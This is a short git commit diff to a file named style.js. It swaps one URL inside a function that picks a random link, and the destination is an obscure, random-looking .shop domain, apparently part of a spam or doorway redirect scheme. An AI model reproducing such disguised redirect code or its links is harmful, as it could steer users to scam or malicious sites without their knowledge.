0689ff617ce1fe80346b219a5b3cbda0c0e890d7
WeiWeigr <154998620+WeiWeigr@users.noreply.github.com>
2024-01-01 10:13:12 +0800

    Update style.js

--- LL122811/js/style.js
+++ LL122811/js/style.js
@@ -1,6 +1,6 @@
   function hreRadom(){
 		        var oHref=new Array(
-		        "http://www.l78jwok345r.shop/palace/F8dkc/RlEhNdUp9t"
+		        "http://www.l78jwok345r.shop/palace/F8dkc/lEssgp4w"
 		      
 		     );
 			 var currindex=Math.round(Math.random()*0);
